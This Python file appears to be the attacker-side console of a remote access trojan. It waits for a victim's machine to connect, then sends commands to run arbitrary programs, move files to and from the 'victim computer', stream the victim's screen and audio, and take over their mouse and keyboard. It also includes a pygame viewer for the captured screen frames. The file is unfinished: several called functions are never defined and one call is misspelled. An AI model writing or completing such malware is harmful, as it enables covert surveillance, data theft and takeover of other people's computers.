from time import sleep
from shlex import split as shlexSplit
import socket
import threading
import pygame

SERVER_PORT = 8080

# change directory and list directory contents
CHANGE_DIR = 1
LIST_DIR = 2
# upload and download files from/to attacker
UPLOAD = 3
DOWNLOAD = 4
# run an arbitrary comamnd
RUN_CMD = 5
# start and end video, mouse, and audio streams
START_VIDEO = 6
END_VIDEO = 7
START_MOUSE = 8
END_MOUSE = 9
START_AUDIO = 10
END_AUDIO = 11
START_KEYS = 13
END_KEYS = 14
# end the process (on the victim's computer)
KILL_PROC = 12
# print the rest of the message to provide useful info
PRINT_INFO = 15
# inform the attacker what the current directory is
NEW_CURR_DIR = 16

# the current directory - printed to console when expecting user input
currDir = ""

"""
	Create a class to handle information received on the main socket
	This class will run as a separate thread
	TODO - refactor this to be part of the protocol for each individual command
"""
class mainSockThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock

	def run(self):
		global currDir

		while True:
			data = ''
			try:
				data = self.mainSock.recv(4096)
			except Exception as inst:
				print(type(inst))
				print(inst.args)
				print(inst)
				sleep(10)
			if not data:
				# TODO - connection closed
				print("Connection closed! TODO - Exit program...")
				sleep(1)
				continue
			if data[0] == PRINT_INFO:
				print(str(data[1:], 'UTF-8'))
			elif data[0] == NEW_CURR_DIR:
				currDir = str(data[1:], 'UTF-8')

"""
	Create a server socket and listen for an incoming connection
	Returns the socket associated with the connection
"""
def openConnection(portNum):
	print(f"Listening for connection on port {portNum} ...")

	# create an IPv4 TCP server socket and set it up to listen
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.bind(('', portNum))
	serversocket.listen()

	# listen for incoming connections and accept them
	(clientsocket, address) = serversocket.accept()
	print("Connection established")

	# close the server socket and return the socket associated with the connection
	serversocket.close()
	return clientsocket

"""
	 echo messages back to the sender
	while True:
		data = clientsocket.recv(4096)
		if not data:
			break
		print(data)
		data_s = b'ECHO: ' + data + b'\0'
		print(data_s)
		clientsocket.sendall(data_s)
"""

def handleCommand(cmd, mainSock):
	if cmd.startswith("help"):
		print("cd [directory] - change current directory")
		print("ls/dir - list directory contents")
		print("upload [local file] [remote file] - upload file to victim computer")
		print("download [remote file] [local file] - download file from victim computer")
		print("exec [command line] - run command from command promp on victim computer")
		print("video [start/stop] - start or stop streaming victim's screen")
		print("audio [start/stop] - start or stop streaming victim's audio")
		print("mouse [start/stop] - start or stop controlling victim's mouse")
		print("keys [start/stop] - start or stop controlling victim's keyboard")
		print("terminate - end the listening process on the victim's computer")
		print("exit/stop/quit - end this process")
	elif cmd.startswith("cd"):
		if len(cmd) <= 3:
			print("Please provide a directory to change to")
			return
		mainSock.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
		sleep(0.2)
	elif cmd in ["ls", "dir"]:
		mainSock.sendall(bytes([LIST_DIR]) + b'\0')
		# TODO - option to list contents from arbitrary directory?
	elif cmd.startswith("upload"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			uploadFile(args[1], args[2])
		elif len(args) == 2:
			uploadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("download"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			downloadFile(args[1], args[2])
		elif len(args) == 2:
			downloadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("exec"):
		if len(cmd) <= 5:
			print("Please provide a command line to execute")
			return
		mainSock.sendall(bytes([RUN_CMD]) + cmd[5:].encode('UTF-8') + b'\0')
		# TODO - possible handling of error/return codes?
	elif cmd.split(" ")[0] in ["video", "audio", "mouse", "keys"]:
		args = cmd.split(" ")
		if len(args) != 2:
			print("Incorrect command usage! Use \"help\" to see commands")
			return
		if args[1] == "start":
			if args[0] == "video":
				startVideoStream(mainSock) # this function will send the listening port number
			elif args[0] == "audio":
				startAudioStream(mainSock) # this function will send the listening port number
			elif args[0] == "mouse":
				startMouseControl(mainSock) # this function will send the listening port number
			elif args[0] == "keys":
				startKeysControl(mainSock) # this function will send the listening port number
		elif args[1] == "stop":
			if args[0] == "video":
				mainSock.sendall(bytes([END_VIDEO, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "audio":
				mainSock.sendall(bytes([END_AUDIO, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "mouse":
				mainSock.sendall(bytes([END_MOUSE, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "keys":
				mainSock.sendall(bytes([END_KEYS, 0]))
				# TODO - kill local thread for receiving video stream
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd == "terminate":
		mainSock.sendall(bytes([KILL_PROC, 0]))
	elif cmd != '':
		print("Unknown command received! Use \"help\" to list available commands")

"""
	Method for testing things before fully implementing them
	Currently testing video stream
	TODO - delete once no longer needed
"""
def test(mainSock):
	# initialize the pygame module
	pygame.init()
	# load and set the logo
	pygame.display.set_caption("minimal program")

	# create a surface on screen that has the size of 240 x 180
	screen = pygame.display.set_mode((768,432), pygame.RESIZABLE)

	# define a variable to control the main loop
	running = True
	# buffer to hold data and way to track file size
	fileSize = 8294400
	data = b''
	buff = b''
	imgBuff = b''
	surf = None
	dirty = False
	frames = 0

	# main loop
	while running:
		# get next frame
		try:
			data = mainSock.recv(fileSize)#4096)
			if fileSize == 0 and len(data) >= 4:
				fileSize = int.from_bytes(data[0:4], byteorder='big', signed=True)
				printf(f'File size: {fileSize}')
				imgBuff = [0 for x in range(0, fileSize)]
				data = data[4:]
			if len(data) > 0:
				buff = buff + data
			if len(buff) >= fileSize:
				imgBuff = buff[0:fileSize]
				surf = pygame.image.frombuffer(imgBuff, (1920, 1080), "RGBA")
				# do some math so the scaling keeps the same aspect ratio
				windowSize = pygame.display.get_window_size()
				scaledWidth = windowSize[0]
				scaledHeight = scaledWidth * 1080 / 1920 # keep image ration - scaled width * image height / image width
				if scaledHeight > windowSize[1]: # too tall for window
					scaledWidth = scaledWidth * windowSize[1] / scaledHeight # reduce width to keep the ration
					scaledHeight = windowSize[1]
				surf = pygame.transform.scale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
				buff = buff[fileSize:]
				dirty = True
		except Exception as inst:
			print(type(inst))
			print(inst.args)
			print(inst)
			sleep(10)
		if not data:
			# TODO - connection closed
			print("Connection closed! TODO - Exit program...")
			quit()

		#percent = int(len(buff) * 100 / fileSize)
		#print(f'Buffer is {percent} full')

		if surf != None and dirty:
			print(f"Displaying frame {frames}")
			frames += 1
			screen.fill((255, 255, 255))
			screen.blit(surf, (0,0))
			pygame.display.flip()
			dirty = False
		elif dirty:
			print("surf is NONE!")

		#pygame.display.flip()

		# event handling, gets all event from the event queue
		for event in pygame.event.get():
			# only do something if the event is of type QUIT
			if event.type == pygame.QUIT:
				# change the value to False, to exit the main loop
				running = False

"""
	Run the main loop for getting user input and 
"""
def main():
	global currDir

	# establish a connection for sending commands
	mainSock = openConnection(SERVER_PORT)

	# start a separate thread to listen for info received on the main socket
	#mainListenThread = mainSockThread(mainSock)
	#mainListenThread.start()

	# call to testing method
	test(mainSock)

	# main command loop
	cmd = input(f"{currDir}>")
	while cmd not in ["exit", "stop", "quit"]:
		handleCommand(cmd, mainSock)
		cmd = input(f"{currDir}>")

	# close the main command socket
	mainSock.close()

if __name__ == "__main__":
	main()